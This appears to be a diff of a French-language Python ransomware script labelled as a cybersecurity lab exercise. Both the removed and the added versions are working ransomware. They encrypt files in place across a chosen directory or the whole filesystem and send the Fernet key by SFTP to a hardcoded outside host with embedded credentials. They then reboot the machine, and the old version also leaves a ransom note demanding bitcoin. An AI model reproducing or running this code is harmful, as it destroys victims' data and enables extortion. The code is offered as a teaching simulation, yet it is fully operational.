@@ -1,190 +1,118 @@
-#script ransomware
-# !/usr/bin/env python3
-# ransomware_total.py - Simulation pédagogique de ransomware (TP cybersécurité)
-
-import os
-import sys
-import logging
-from pathlib import Path
 from cryptography.fernet import Fernet
-import paramiko
-import socket
-import time
+import os
+import sqlite3
+import sys
 import subprocess
-
-# Configuration
-SFTP_SERVER = "192.168.64.6"
-SFTP_PORT = 22
-SFTP_USER = "sftpuser"
-SFTP_PASS = "kali"
-SFTP_KEY_PATH = "/home/"
-RANSOM_NOTE = "/root/README.txt"
-
-# Setup logging
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[logging.FileHandler("/tmp/ransomware.log"), logging.StreamHandler()]
-)
+import paramiko
 
 
-class RansomwareSimulator:
-    def __init__(self):
-        self.key = None
-        self.cipher = None
-        self.encrypted_files = 0
-        self.skipped_files = 0
-        self.error_files = 0
-        self.total_size = 0
-        self.start_time = time.time()
+def check_root():
+    """Vérifie si le script est exécuté en tant que root."""
+    if os.geteuid() != 0:
+        print("Ce script doit être exécuté en tant que root.")
+        sys.exit(1)
 
-    def generate_key(self):
-        """Generate encryption key"""
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        logging.info(f"Generated encryption key: {self.key.decode()[:10]}...")
 
-    def exfiltrate_key(self):
-        """Send key to attacker via SFTP"""
-        try:
-            hostname = socket.gethostname()
-            key_filename = f"{hostname}_{int(time.time())}.key"
+def generate_key():
+    """Génère et enregistre une clé de chiffrement."""
+    key = Fernet.generate_key()
+    with open("/root/secret.key", "wb") as key_file:
+        key_file.write(key)
+    return key
 
-            transport = paramiko.Transport((SFTP_SERVER, SFTP_PORT))
-            transport.connect(username=SFTP_USER, password=SFTP_PASS)
-            sftp = paramiko.SFTPClient.from_transport(transport)
 
-            remote_path = f"{SFTP_KEY_PATH}{key_filename}"
-            with sftp.file(remote_path, 'w') as f:
-                f.write(self.key)
+def load_key():
+    """Charge la clé de chiffrement."""
+    return open("/root/secret.key", "rb").read()
 
-            sftp.close()
-            transport.close()
-            logging.info(f"Key exfiltrated to {SFTP_SERVER}:{remote_path}")
-            return True
-        except Exception as e:
-            logging.error(f"Key exfiltration failed: {str(e)}")
-            return False
 
-    def encrypt_file(self, filepath):
-        """Encrypt a single file in-place"""
-        try:
-            # Skip special files
-            if not filepath.is_file() or filepath.is_symlink():
-                return False
+def send_key_to_sftp(key):
+    """Envoie la clé de chiffrement au serveur SFTP."""
+    sftp_host = "192.168.45.79"  # Remplace avec ton hôte SFTP
+    sftp_port = 22  # Port SFTP (généralement 22)
+    sftp_username = "root"  # Nom d'utilisateur pour SFTP
+    sftp_password = "P@ssw0rd"  # Mot de passe pour SFTP
+    remote_path = "/secret.key"  # Chemin distant où la clé sera envoyée
 
-            # Skip files that are too large (>100MB) for demo purposes
-            file_size = filepath.stat().st_size
-            if file_size > 100 * 1024 * 1024:  # 100MB
-                self.skipped_files += 1
-                return False
+    try:
+        transport = paramiko.Transport((sftp_host, sftp_port))
+        transport.connect(username=sftp_username, password=sftp_password)
+        sftp = paramiko.SFTPClient.from_transport(transport)
+        # Sauvegarde de la clé dans un fichier temporaire
+        with open("/root/secret.key", "wb") as f:
+            f.write(key)
+        # Envoi du fichier vers le serveur SFTP
+        sftp.put("/root/secret.key", remote_path)
+        sftp.close()
+        transport.close()
+        print(f"Clé envoyée à {sftp_host}:{remote_path}")
+    except Exception as e:
+        print(f"Erreur lors de l'envoi de la clé via SFTP: {e}")
 
-            # Read original content
-            with open(filepath, 'rb') as f:
-                original_data = f.read()
 
-            # Encrypt and overwrite
-            encrypted_data = self.cipher.encrypt(original_data)
-            with open(filepath, 'wb') as f:
-                f.write(encrypted_data)
+def encrypt_file(file_path, cipher):
+    """Chiffre un fichier en remplaçant son contenu."""
+    try:
+        with open(file_path, "rb") as file:
+            data = file.read()
+        encrypted_data = cipher.encrypt(data)
+        with open(file_path, "wb") as file:
+            file.write(encrypted_data)
+    except Exception as e:
+        print(f"[ERREUR] Impossible de chiffrer {file_path}: {e}")
 
-            self.encrypted_files += 1
-            self.total_size += file_size
-            return True
 
-        except Exception as e:
-            self.error_files += 1
-            logging.error(f"Error encrypting {filepath}: {str(e)}")
-            return False
+def decrypt_file(file_path, cipher):
+    """Déchiffre un fichier en restaurant son contenu original."""
+    try:
+        with open(file_path, "rb") as file:
+            encrypted_data = file.read()
+        decrypted_data = cipher.decrypt(encrypted_data)
+        with open(file_path, "wb") as file:
+            file.write(decrypted_data)
+    except Exception as e:
+        print(f"[ERREUR] Impossible de déchiffrer {file_path}: {e}")
 
-    def encrypt_filesystem(self, root_path="/"):
-        """Recursively encrypt files starting from root_path"""
-        logging.info(f"Starting filesystem encryption from {root_path}")
 
-        for path in Path(root_path).rglob('*'):
+def process_directory(directory, cipher, encrypt=True):
+    """Parcourt un dossier et chiffre/déchiffre chaque fichier tout en évitant les fichiers critiques du système."""
+    system_exclude = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/root/secret.key"]
+
+    for root, _, files in os.walk(directory):
+        if any(root.startswith(excl) for excl in system_exclude):
+            continue
+
+        for file in files:
+            file_path = os.path.join(root, file)
             try:
-                if path.is_dir():
-                    continue
-
-                self.encrypt_file(path)
-
-                # Log progress every 100 files
-                if self.encrypted_files % 100 == 0:
-                    logging.info(
-                        f"Progress: {self.encrypted_files} files encrypted, "
-                        f"{self.skipped_files} skipped, {self.error_files} errors"
-                    )
-
+                if encrypt:
+                    encrypt_file(file_path, cipher)
+                else:
+                    decrypt_file(file_path, cipher)
+                print(f"{'Chiffré' if encrypt else 'Déchiffré'} : {file_path}")
             except Exception as e:
-                logging.error(f"Error processing {path}: {str(e)}")
-                self.error_files += 1
-                continue
+                print(f"[ERREUR] sur {file_path}: {e}")
 
-    def leave_ransom_note(self):
-        """Create a ransom note"""
-        note_content = f"""ATTENTION!
 
-Vos fichiers ont été chiffrés avec un algorithme militaire AES-256.
-Pour récupérer vos données, vous devez payer une rançon de 0.001 BTC.
-
-Envoyez un email à ransomware@example.com avec votre clé unique:
-{self.key.decode()}
-
-Vous avez 48 heures avant que la clé ne soit définitivement supprimée.
-"""
-        try:
-            with open(RANSOM_NOTE, 'w') as f:
-                f.write(note_content)
-            logging.info(f"Ransom note left at {RANSOM_NOTE}")
-        except Exception as e:
-            logging.error(f"Failed to leave ransom note: {str(e)}")
-
-    def reboot_system(self):
-        """Schedule system reboot"""
-        logging.info("Scheduling system reboot in 60 seconds...")
-        try:
-            subprocess.run(["shutdown", "-r", "+1"], check=True)
-            logging.info("Reboot scheduled successfully")
-        except subprocess.CalledProcessError as e:
-            logging.error(f"Failed to schedule reboot: {str(e)}")
-
-    def run(self):
-        """Main execution flow"""
-        if os.geteuid() != 0:
-            logging.error("This script must be run as root!")
-            sys.exit(1)
-
-        logging.warning("=== STARTING RANSOMWARE SIMULATION ===")
-
-        # Step 1: Generate encryption key
-        self.generate_key()
-
-        # Step 2: Exfiltrate key
-        if not self.exfiltrate_key():
-            logging.error("Key exfiltration failed - aborting!")
-            sys.exit(1)
-
-        # Step 3: Encrypt filesystem
-        self.encrypt_filesystem()
-
-        # Step 4: Leave ransom note
-        self.leave_ransom_note()
-
-        # Step 5: Reboot system
-        self.reboot_system()
-
-        # Final stats
-        duration = time.time() - self.start_time
-        logging.info(
-            f"=== ENCRYPTION COMPLETE ==="
-            f"\nFiles encrypted: {self.encrypted_files}"
-            f"\nFiles skipped:   {self.skipped_files}"
-            f"\nEncryption errors: {self.error_files}"
-            f"\nTotal data processed: {self.total_size / (1024 * 1024):.2f} MB"
-            f"\nDuration: {duration:.2f} seconds"
-        )
+def restart_system():
+    """Redémarre le système après chiffrement."""
+    print("Redémarrage du système dans 10 secondes...")
+    subprocess.run(["shutdown", "-r", "now"])
 
 
 if __name__ == "__main__":
-    simulator = RansomwareSimulator()
-    simulator.run()
+    check_root()
+    directory = input("Entrez le chemin du dossier à traiter (/ pour tout le système) : ")
+    action = input("Tapez 'E' pour chiffrer ou 'D' pour déchiffrer : ").strip().upper()
+
+    if action == 'E':
+        key = generate_key()
+        send_key_to_sftp(key)
+    else:
+        key = load_key()
+
+    cipher = Fernet(key)
+    process_directory(directory, cipher, encrypt=(action == 'E'))
+
+    if action == 'E':
+        restart_system()
